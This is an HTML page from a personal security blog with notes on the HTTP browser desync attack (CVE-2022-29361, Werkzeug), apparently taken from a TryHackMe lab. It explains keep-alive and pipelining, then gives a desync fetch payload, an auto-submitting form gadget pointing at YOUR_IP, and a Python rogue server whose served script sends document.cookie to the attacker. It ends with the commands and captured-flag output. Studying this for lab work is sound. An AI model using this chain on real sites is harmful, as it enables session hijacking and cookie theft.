@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="ro-ro">
+<head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTTP browser desync | Cyber Blog-ul lui Novac</title>
+<meta property="og:title" content="HTTP browser desync | Cyber Blog-ul lui Novac" />
+<meta name="twitter:title" content="HTTP browser desync | Cyber Blog-ul lui Novac" />
+<meta itemprop="name" content="HTTP browser desync | Cyber Blog-ul lui Novac" />
+<meta name="application-name" content="HTTP browser desync | Cyber Blog-ul lui Novac" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="">
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+<meta property="og:locale" content="ro-ro" />
+<meta name="language" content="ro-ro" />
+
+  <link rel="alternate" hreflang="en" href="https://novaclearnscyber.github.io/blog/posts/http-browser-desync/" title="" />
+
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2026-11-24T09:57:02Z />
+    <meta property="article:published_time" content=2026-11-24T09:57:02Z />
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/http-browser-desync/" />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HTTP browser desync",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2026-11-24",
+        "description": "",
+        "wordCount":  1154 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2026-11-24",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "Cyber Blog-ul lui Novac"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="https://novaclearnscyber.github.io/blog/posts/http-browser-desync/">
+  <meta property="og:site_name" content="Cyber Blog-ul lui Novac">
+  <meta property="og:title" content="HTTP browser desync">
+  <meta property="og:description" content="HTTP Keep-Alive HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. It helps reduce latency and improve performance by avoiding the need to open and close connections repeatedly. However, it can introduce a security risk known as Cache Poisoning. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. An attacker might exploit desynchronization issues to store malicious content in caches.">
+  <meta property="og:locale" content="ro_ro">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2026-11-24T09:57:02+00:00">
+    <meta property="article:modified_time" content="2026-11-24T10:38:25+00:00">
+    <meta property="article:tag" content="Note">
+    <meta property="article:tag" content="Journal">
+    <meta property="article:tag" content="CyberStuff">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTTP browser desync">
+  <meta name="twitter:description" content="HTTP Keep-Alive HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. It helps reduce latency and improve performance by avoiding the need to open and close connections repeatedly. However, it can introduce a security risk known as Cache Poisoning. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. An attacker might exploit desynchronization issues to store malicious content in caches.">
+
+
+    
+
+    <link rel="canonical" href="https://novaclearnscyber.github.io/blog/posts/http-browser-desync/">
+    <link href="/blog/style.min.e390ba7da26222f4dc42a349955d76dbbe44e5ce2535a43de5a70633a0a9ec3c.css" rel="stylesheet">
+    <link href="/blog/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/blog/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/blog/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/blog/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/blog/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/blog/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://novaclearnscyber.github.io/blog/site.webmanifest">
+
+<meta name="msapplication-config" content="/blog/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+    <meta name="color-scheme" content="light dark">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/blog/icons/favicon.svg">
+
+    
+    
+    
+      
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="shortcut icon" href="/favicon.png">
+    
+</head>
+
+
+<body>
+    <div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://novaclearnscyber.github.io/blog/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/blog/categories/">
+                        Categories
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            
+        </div>
+    </nav>
+</div>
+
+    <style>
+        .custom-banner {
+            width: 100%;
+
+            height: {
+                    {
+                    .Site.Params.banner_height | default "300px"
+                }
+            }
+
+            ;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (max-width: 768px) {
+            .custom-banner {
+                height: 200px !important;
+                 
+            }
+        }
+    </style>
+
+    
+    <div class="custom-banner">
+        <div
+            style="background-image: url('https://novaclearnscyber.github.io/blog/siteBackcopy.png'); width: 100%; height: 100%; background-size: cover; background-position: center;">
+        </div>
+    </div>
+    
+
+    <div id="content">
+        
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTTP browser desync</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-11-24T09:57:02&#43;00:00" itemprop="datePublished"> 24 nov. 2026 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <h4 id="httpkeep-alive">HTTP Keep-Alive</h4>
+<p>HTTP keep-alive is a mechanism that allows the reuse of a single TCP connection for multiple HTTP requests and responses. It helps reduce latency and improve performance by avoiding the need to open and close connections repeatedly. However, it can introduce a security risk known as Cache Poisoning. If caching mechanisms are in place, the persistence of connections through keep-alive could contribute to cache poisoning attacks. An attacker might exploit desynchronization issues to store malicious content in caches.</p>
+<p><img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/31b445178b7298aaff4c28904d625efd.svg" alt="HTTP Keep Alive">
+</p>
+<h4 id="http-pipelining">HTTP Pipelining</h4>
+<p>Usually, with HTTP, one request results in one response. If the HTTP pipelining is enabled in the backend server, it will allow the simultaneous sending of two requests with the corresponding responses without waiting for each response. The only way to differentiate between two requests and a big one is by using the Content-Length header, which specifies the length in bytes of each request. The content header is an unnecessary header for most static file contents in a web application, like images or icons, since the backend server will usually not consider it.</p>
+<p><img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/85db7590a8b78c3cc399dfc2c3a7507a.svg" alt="HTTP Pipeling">
+</p>
+<h4 id="httpbrowser-desync-identification">HTTP Browser Desync Identification</h4>
+<p>For a better understanding of HTTP Browser Desynchronization, we will use a web application vulnerable to <a href="https://nvd.nist.gov/vuln/detail/cve-2022-29361">CVE-2022-29361</a>. The web app will serve a single route.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flaskapp <span style="color:#f92672">=</span> Flask(__name__) <span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>]) <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>(): <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;&#34; CVE-2022-29361 Welcome to the Vulnerable Web Application &#34;&#34;&#34;</span> <span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>: app<span style="color:#f92672">.</span>run(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, <span style="color:#ae81ff">5000</span>)
+</span></span></code></pre></div><p>The web server impacted by this CVE is running Werkzeug v2.1.0, a versatile WSGI web application library. The crucial update in commit  <a href="https://github.com/pallets/werkzeug/commit/4795b9a7">4795b9a7</a> allows keep-alive connections when threaded or process options are configured.</p>
+<p><img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/2548368943dc6c40dad4558fc73e1943.png" alt="Browser Desync Vulnerable Commit">
+</p>
+<p>To execute the attack, a straightforward approach is to utilize the <code>fetch</code> JavaScript function. This function allows for maintaining the connection ID across requests. The connection ID refers to a unique identifier assigned to a network connection between the client (browser) and the server. This identifier helps the server keep track of multiple connections and distinguish between them.</p>
+<p>This consistent connection ID lies in its ability to facilitate exploitation for an attacker that could expose user information or session tokens such as cookies.</p>
+<p>Moreover, in a cross-site attack, the browser shares user cookies based on how the <code>SameSite</code> flag is set (CORS), but this security rule doesn&rsquo;t apply if the current domain matches the remote one, as in Browser Desync attacks. In such cases, there&rsquo;s no restriction. </p>
+<p>You can hack your session by using the following payload from your browser command line.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fetch(<span style="color:#e6db74">&#39;http://10.113.165.158:5000/&#39;</span>, {    method: <span style="color:#e6db74">&#39;POST&#39;</span>,    body: <span style="color:#e6db74">&#39;GET /redirect HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Foo: x&#39;</span>,    mode: <span style="color:#e6db74">&#39;cors&#39;</span>,})
+</span></span></code></pre></div><ol>
+<li><code>http://10.113.165.158:5000/</code><br>
+This is the URL to which the HTTP request is made for the vulnerable server. In this case, it&rsquo;s the registration endpoint on the local server.</li>
+<li><code>{ method: 'POST' }</code>The <code>method</code> parameter specifies the HTTP method for the request. Here, it&rsquo;s set to &lsquo;POST&rsquo;.</li>
+<li><code>{ body: 'GET /redirect HTTP/1.1\r\nFoo: x' }   </code>In the body, there is the second request that is going to be injected into the queue.</li>
+<li><code>{ mode: 'cors' }</code>This flag triggers an error when visiting the 404 web page and avoids following the redirect.</li>
+</ol>
+<p>First, let’s start the Lab Machine by pressing the Start Lab Machine button at the top of this task. The vulnerable website will be running at the port 5000. </p>
+<p>Furthermore, this implies that an attacker can obtain complete control over a victim&rsquo;s browser when the specified payload is executed from the victim.</p>
+<p>The following screenshots will show an example of the attack using the previous payload.</p>
+<p> <img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/d7b193c819734e10a561827cffcfd406.png" alt="Browser Desync Attack Vulnerable Redirect">
+</p>
+<p>The desync attack involves injecting an arbitrary request into the request HTTP queue. Upon refreshing the page, it redirects to the /redirect endpoint, leading to a 404 error page display since that route is not present. </p>
+<p><img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/6cab09b50ae05a0cb793992a74c82307.png" alt="Browser Desync Attack Connection Poisoned">
+</p>
+<p>HTTP Browser Desync exploit chaining XSS</p>
+<p>Based on the considerations outlined in previous tasks, one potential attack vector involves replacing the following request with an arbitrary JavaScript file to execute custom code. However, this strategy necessitates the presence of an arbitrary file upload feature on the website.<br>
+Instead, we can use a rogue server to deliver an XSS attack to steal the cookie from the victim. </p>
+<p>We can use the following gadget and deliver it to abuse any component of the web application that allows to reflect text and probably be visited by a user:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>form id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://challenge.thm/&#34;</span>
+</span></span><span style="display:flex;"><span>    method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
+</span></span><span style="display:flex;"><span>    enctype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>textarea name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET http://YOUR_IP HTTP/1.1</span>
+</span></span><span style="display:flex;"><span>AAA: A<span style="color:#e6db74">&#34;&gt;placeholder1&lt;/textarea&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>button type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">&gt;</span>placeholder2<span style="color:#f92672">&lt;/</span>button<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>form<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>script<span style="color:#f92672">&gt;</span> btn<span style="color:#f92672">.</span>submit() <span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>We utilize a form because it inherently supports a keep-alive connection by default. The type is used to avoid the default encoding MIME type since we don&rsquo;t want to encode the second malicious request.<br>
+Furthermore, the textarea&rsquo;s name attribute will overwrite the bytes of the following request, enabling redirection to our rogue server.<br>
+To summarize, this gadget operates by using the initial request to position the victim within the connection context of the vulnerable server. The following request retrieves the malicious payload, compromising the victim&rsquo;s session.</p>
+<p>To do so, we can set up a rogue server by serving a route with a malicious payload like <code>fetch('http://YOUR_IP/' + document.cookie);</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Be ready <span style="color:#66d9ef">for</span> the challenge <span style="color:#f92672">in</span> the next task; you will have to solve it using this exploit<span style="color:#960050;background-color:#1e0010">!</span>
+</span></span></code></pre></div><blockquote>
+<p>EXEMPLU CHALLENGE ,MIE NU MIA MERS BAG PL</p>
+</blockquote>
+<p>Challenge Help<br>
+﻿In this task, we will look for a possible way to solve the challenge of the previous task.</p>
+<p>Firstly, you have to add in your /etc/hosts file the following entry:</p>
+<p><code>10.114.143.12 challenge.thm</code></p>
+<p>It can be observed that utilizing the given payload and refreshing the page results in a 404 error page. This indicates that the web server is vulnerable to request smuggling browser desync.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>fetch(<span style="color:#e6db74">&#39;http://challenge.thm/&#39;</span>, {    method: <span style="color:#e6db74">&#39;POST&#39;</span>,    body: <span style="color:#e6db74">&#39;GET /redirect HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Foo: x&#39;</span>,    mode: <span style="color:#e6db74">&#39;cors&#39;</span>,})
+</span></span></code></pre></div><p>Next, we can observe that the contact page does not correctly sanitize text input, potentially allowing us to send an arbitrary payload.</p>
+<p><img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/dff30d90a55e2ae46ef41aea01194e96.png" alt="Browser Desync Attack Vulnerable Functionality">
+</p>
+<p>Visting  <a href="http://challenge.thm/securecontact">http://challenge.thm/securecontact</a> you can notice that the input from the message field is reflected but is not interpreted:</p>
+<p><img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/ba1ae0a040c95ada5fcd3e3bbc44e28c.png" alt="Browser Desync Attack Secure Contact">
+</p>
+<p>The victim will instead visit another page <a href="http://challenge.thm/vulnerablecontact">http://challenge.thm/vulnerablecontact</a> where the input will be interpreted.</p>
+<p><img src="https://cdn-images.tryhackme.com/user-uploads/63c131e50a24c3005eb34678/room-content/a2834f4fe56b297a57576c0f6d4992b6.png" alt="Browser Desync Attack Contact Vulnerable">
+</p>
+<p>Now, we just need to build our payload to redirect the victim user to fetch the second payload from our server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>form id<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span> action<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://challenge.thm/&#34;</span>
+</span></span><span style="display:flex;"><span>    method<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span>
+</span></span><span style="display:flex;"><span>    enctype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>textarea name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET http://YOUR_IP:1337 HTTP/1.1</span>
+</span></span><span style="display:flex;"><span>AAA: A<span style="color:#e6db74">&#34;&gt;placeholder1&lt;/textarea&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>button type<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span><span style="color:#f92672">&gt;</span>placeholder2<span style="color:#f92672">&lt;/</span>button<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span>form<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>script<span style="color:#f92672">&gt;</span> btn<span style="color:#f92672">.</span>submit() <span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Finally, we will serve a payload on our controlled server to steal the user&rsquo;s cookie and send it to us.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> http.server <span style="color:#f92672">import</span> BaseHTTPRequestHandler, HTTPServer
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ExploitHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">do_GET</span>(self):
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> self<span style="color:#f92672">.</span>path <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;/&#39;</span>:
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_response(<span style="color:#ae81ff">200</span>)
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#34;Access-Control-Allow-Origin&#34;</span>, <span style="color:#e6db74">&#34;*&#34;</span>)
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>send_header(<span style="color:#e6db74">&#34;Content-type&#34;</span>,<span style="color:#e6db74">&#34;text/html&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>end_headers()
+</span></span><span style="display:flex;"><span>            self<span style="color:#f92672">.</span>wfile<span style="color:#f92672">.</span>write(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;fetch(&#39;http://YOUR_IP:8080/&#39; + document.cookie)&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">run_server</span>(port<span style="color:#f92672">=</span><span style="color:#ae81ff">1337</span>):   
+</span></span><span style="display:flex;"><span>    server_address <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#39;&#39;</span>, port)
+</span></span><span style="display:flex;"><span>    httpd <span style="color:#f92672">=</span> HTTPServer(server_address, ExploitHandler)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Server running on port </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    httpd<span style="color:#f92672">.</span>serve_forever()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    run_server()
+</span></span></code></pre></div><p>Run it by with the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sudo python3 server<span style="color:#f92672">.</span>py 
+</span></span></code></pre></div><p>Note that the victim will make an additional request to port 8080; you can serve another Python web service by using:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sudo python3 <span style="color:#f92672">-</span>m http<span style="color:#f92672">.</span>server <span style="color:#ae81ff">8080</span>
+</span></span></code></pre></div><p>Now, after around a minute, you should get the flag!</p>
+<p>Terminal</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell-session" data-lang="shell-session"><span style="display:flex;"><span>root@attackbox ~ [1]&gt; sudo python3 -m http.server 8080Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/)- - [18/Jan/2024 10:49:51] &#34;GET /flag=THM{REDACTED} HTTP/1.1&#34; 404 -w
+</span></span></code></pre></div>
+            </div>
+        </article></main>
+</div>
+
+    </div>
+    <footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        
+    </small>
+</footer>
+</body>
+
+</html>
